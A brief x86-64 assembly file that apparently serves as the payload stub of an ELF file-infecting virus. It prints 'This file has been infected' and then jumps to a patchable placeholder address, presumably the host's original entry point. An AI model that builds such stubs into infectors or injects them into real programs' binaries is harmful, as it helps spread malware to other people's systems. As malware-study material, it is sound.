section	.text
	global	_start

_start:
	mov		rax, 1
	mov		rdi, 1
	lea		rsi, [rel msg]
	mov		rdx, msg_end - msg
	syscall

	xor		rdx, rdx
	mov		rax, [rel addr]
	jmp		rax

msg:		db 'This file has been infected', 10, 0
msg_end:	db 0x0
addr:		dq 0x2222222222222222
